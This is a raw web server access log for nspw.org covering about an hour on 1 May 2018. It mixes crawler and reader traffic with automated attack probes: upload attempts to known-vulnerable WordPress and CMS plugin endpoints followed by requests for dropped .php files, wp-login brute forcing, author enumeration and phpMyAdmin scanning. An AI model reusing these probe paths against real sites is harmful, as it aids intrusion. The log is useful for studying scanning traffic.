www.nspw.org:80 128.29.43.2 - - [01/May/2018:14:28:34 -0400] "GET /papers/2013/nspw2013-rowe.pdf HTTP/1.1" 302 587 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:28:53 -0400] "GET /papers/2007/nspw2007-chow.pdf HTTP/1.1" 302 587 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:30:12 -0400] "POST / HTTP/1.1" 302 488 "http://nspw.org/wp-admin/" "Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:30:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:14:30:38 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 85.49.93.57 - - [01/May/2018:14:31:47 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 85.49.93.57 - - [01/May/2018:14:31:48 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:32:57 -0400] "POST /license.php HTTP/1.1" 302 510 "http://nspw.org/wp-admin/" "Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0"
www.nspw.org:80 111.177.117.36 - - [01/May/2018:14:33:55 -0400] "GET / HTTP/1.1" 302 529 "-" "-"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:14:34:09 -0400] "GET /papers/2001/nspw2001-brostoff.pdf HTTP/1.1" 302 595 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:35:15 -0400] "POST /wp-content/plugins/formcraft/file-upload/server/content/upload.php HTTP/1.1" 302 657 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:35:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:35:45 -0400] "POST /wp-admin/admin-ajax.php HTTP/1.1" 302 571 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:14:36:25 -0400] "GET /papers/2013/nspw2013-crane.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:14:36:27 -0400] "GET /papers/2008/nspw2008-bishop.pdf HTTP/1.1" 302 590 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:37:12 -0400] "POST /uploadify/uploadify.php?folder=/ HTTP/1.1" 302 552 "http://nspw.org/wp-admin/" "Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0"
www.nspw.org:80 37.148.145.188 - - [01/May/2018:14:37:39 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 37.148.145.188 - - [01/May/2018:14:37:40 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:14:37:48 -0400] "GET /papers/1999/nspw1999-michael.pdf HTTP/1.1" 302 593 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:14:37:50 -0400] "GET /papers/2007/?C=M;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 35.202.236.114 - - [01/May/2018:14:38:19 -0400] "GET /papers/1993/nspw1993-thuraisingham.pdf HTTP/1.1" 302 549 "-" "Python/3.5 aiohttp/3.1.3"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:38:20 -0400] "POST /wp-content/plugins/zen-mobile-app-native/server/images.php HTTP/1.1" 302 641 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:38:20 -0400] "GET /proceedings/2006/nspw2006-naegoe.pdf HTTP/1.1" 302 601 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:14:38:51 -0400] "GET /papers/2006/?C=M;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:40:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:41:22 -0400] "GET /2004/pre-proceedings/SadStu2004.pdf HTTP/1.1" 302 599 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:14:41:23 -0400] "GET /2009/proceedings/1999/?C=D;O=A HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:14:41:25 -0400] "GET /papers/2002/nspw2002-marceau.pdf HTTP/1.1" 302 593 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:14:41:39 -0400] "GET /2005/dates.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:41:41 -0400] "GET /2009/proceedings/2008/nspw2008-crandall.pdf HTTP/1.1" 302 615 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:14:42:04 -0400] "GET /2005/cfp.content HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:14:42:16 -0400] "GET /2005/oc.shtml HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 185.232.20.242 - - [01/May/2018:14:42:37 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [01/May/2018:14:42:37 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [01/May/2018:14:42:37 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:42:49 -0400] "GET /static/js/tiny_mce/plugins/tinybrowser/upload.php?type=file/wp-login.php HTTP/1.1" 302 669 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:42:50 -0400] "GET /admin/lib/tiny_mce/plugins/tinybrowser/upload.php?type=file/wp-login.php HTTP/1.1" 302 613 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:42:50 -0400] "GET /tiny_mce/plugins/tinybrowser/upload.php?type=file/wp-login.php HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:42:50 -0400] "GET /editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php?type=file/wp-login.php HTTP/1.1" 302 643 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:14:42:56 -0400] "GET /2014/local HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 54.36.149.80 - - [01/May/2018:14:43:06 -0400] "GET /2012/cfp HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:14:44:03 -0400] "GET /user HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 123.125.71.41 - - [01/May/2018:14:44:53 -0400] "GET /papers/2007/nspw2007-locasto.pdf?origin=publication_detail HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4"
www.nspw.org:80 220.181.108.168 - - [01/May/2018:14:44:54 -0400] "GET /papers/2007/nspw2007-locasto.pdf?origin=publication_detail HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:14:44:54 -0400] "GET /2009/proceedings/2006/nspw2006-ford.pdf HTTP/1.1" 302 607 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 123.125.71.20 - - [01/May/2018:14:44:57 -0400] "GET /papers/2007/nspw2007-locasto.pdf?origin=publication_detail HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4"
www.nspw.org:80 39.51.110.207 - - [01/May/2018:14:44:58 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 39.51.110.207 - - [01/May/2018:14:45:02 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:45:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:14:46:21 -0400] "GET /2009/proceedings/1998/nspw1998-chang.pdf HTTP/1.1" 302 609 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 82.18.179.65 - - [01/May/2018:14:46:50 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 82.18.179.65 - - [01/May/2018:14:46:52 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:14:47:10 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 40.77.167.208 - - [01/May/2018:14:48:12 -0400] "GET /papers/1998/nspw1998-abrams.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 185.165.34.153 - - [01/May/2018:14:49:18 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 185.165.34.153 - - [01/May/2018:14:49:19 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:50:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 222.217.32.245 - - [01/May/2018:14:53:26 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 157.55.39.28 - - [01/May/2018:14:53:53 -0400] "GET /robots.txt HTTP/1.1" 302 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 157.55.39.242 - - [01/May/2018:14:53:57 -0400] "GET /papers/1994/nspw1994-schneier.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 168.90.225.86 - - [01/May/2018:14:54:27 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 168.90.225.86 - - [01/May/2018:14:54:28 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:55:12 -0400] "POST /wp-content/plugins/asset-manager/upload.php HTTP/1.1" 302 611 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:14:55:12 -0400] "GET /wp-content/uploads/assets/temp/aff66.php HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:14:55:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:41 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:42 -0400] "GET /?author=1 HTTP/1.1" 302 546 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:43 -0400] "GET /?author=2 HTTP/1.1" 302 546 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:43 -0400] "GET /?author=3 HTTP/1.1" 302 546 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:44 -0400] "GET /?author=4 HTTP/1.1" 302 546 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:44 -0400] "GET /?author=5 HTTP/1.1" 302 546 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:44 -0400] "GET /?author=6 HTTP/1.1" 302 546 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:45 -0400] "GET /?author=7 HTTP/1.1" 302 546 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:45 -0400] "GET /?author=8 HTTP/1.1" 302 546 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:46 -0400] "GET /?author=9 HTTP/1.1" 302 546 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:46 -0400] "GET /?author=10 HTTP/1.1" 302 548 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:47 -0400] "GET /?author=11 HTTP/1.1" 302 548 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:47 -0400] "GET /?author=12 HTTP/1.1" 302 548 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:48 -0400] "GET /?author=13 HTTP/1.1" 302 548 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:48 -0400] "GET /?author=14 HTTP/1.1" 302 548 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 123.206.212.37 - - [01/May/2018:14:59:49 -0400] "GET /?author=15 HTTP/1.1" 302 548 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:00:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:01:29 -0400] "POST /assets/modules/evogallery/js/uploadify/uploadify.php HTTP/1.1" 302 629 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:01:29 -0400] "GET /6aaba.php HTTP/1.1" 302 487 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 168.1.128.36 - - [01/May/2018:15:01:43 -0400] "GET / HTTP/1.1\n" 400 0 "-" "-"
www.nspw.org:80 61.181.142.82 - - [01/May/2018:15:01:45 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;)"
www.nspw.org:80 79.166.163.3 - - [01/May/2018:15:01:53 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "https://www.google.gr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:15:01:57 -0400] "GET /papers/2005/nspw2005-peisert.pdf HTTP/1.1" 302 593 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:15:03:12 -0400] "GET /2005/PC/Oleg%20Kolesnikov.pdf HTTP/1.1" 302 587 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 77.75.76.167 - - [01/May/2018:15:05:17 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:15:05:18 -0400] "GET /papers/2001/nspw2001-hosmer.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 77.75.76.167 - - [01/May/2018:15:05:21 -0400] "GET /2005/texput.log HTTP/1.1" 302 559 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.76.167 - - [01/May/2018:15:05:24 -0400] "GET /2009/panel.html HTTP/1.1" 302 558 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.76.167 - - [01/May/2018:15:05:25 -0400] "GET /2014/program HTTP/1.1" 302 552 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.76.167 - - [01/May/2018:15:05:25 -0400] "GET /2010/local HTTP/1.1" 302 548 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:05:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:15:06:50 -0400] "GET /2009/proceedings/1999/nspw1999-lipson.pdf HTTP/1.1" 302 611 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 179.234.145.171 - - [01/May/2018:15:07:49 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:07:50 -0400] "POST /wp-content/plugins/wp-easycart/inc/amfphp/administration/banneruploaderscript.php HTTP/1.1" 302 687 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:07:50 -0400] "GET /wp-content/plugins/wp-easycart/products/banners/4d209_1.php HTTP/1.1" 302 587 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 179.234.145.171 - - [01/May/2018:15:07:51 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.53.205.134 - - [01/May/2018:15:08:57 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.65.115 - - [01/May/2018:15:09:27 -0400] "GET /papers/2002/nspw2002-marceau.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 95.53.205.134 - - [01/May/2018:15:09:32 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.53.205.134 - - [01/May/2018:15:09:33 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:10:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:15:11:45 -0400] "GET /papers/2012/docs/p15.pdf HTTP/1.1" 302 577 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:15:12:50 -0400] "GET /papers/2013-pre/waste-style.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 54.36.148.28 - - [01/May/2018:15:14:44 -0400] "GET /proceedings/1999 HTTP/1.1" 302 501 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:15:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:15:16:08 -0400] "GET /2009/proceedings/1998/nspw1998-kahn.pdf HTTP/1.1" 302 607 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:15:16:31 -0400] "GET /2009/proceedings/1996/nspw1996-nelson.pdf HTTP/1.1" 302 611 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:15:17:21 -0400] "GET /papers/1998/nspw1998-greenwald.pdf HTTP/1.1" 302 597 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 153.120.13.148 - - [01/May/2018:15:17:33 -0400] "HEAD /current/ HTTP/1.1" 302 233 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
www.nspw.org:80 174.28.97.160 - - [01/May/2018:15:17:34 -0400] "GET /2017 HTTP/1.1" 302 537 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
www.nspw.org:80 ::1 - - [01/May/2018:15:17:44 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:17:45 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 153.120.13.148 - - [01/May/2018:15:17:46 -0400] "GET /current/ HTTP/1.1" 302 545 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
www.nspw.org:80 ::1 - - [01/May/2018:15:17:52 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:17:53 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:03 -0400] "PROPFIND / HTTP/1.1" 302 489 "-" "-"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:03 -0400] "PROPFIND / HTTP/1.1" 302 489 "-" "-"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:18 -0400] "GET /index.php HTTP/1.1" 302 549 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:19 -0400] "GET /index.php HTTP/1.1" 302 549 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:19 -0400] "GET /phpmyadmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:19 -0400] "GET /phpmyadmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:19 -0400] "GET /phpMyAdmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:19 -0400] "GET /phpMyAdmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:19 -0400] "GET /pmd/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:19 -0400] "GET /pmd/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:19 -0400] "GET /pma/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:20 -0400] "GET /pma/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:20 -0400] "GET /PMA/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:20 -0400] "GET /PMA/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
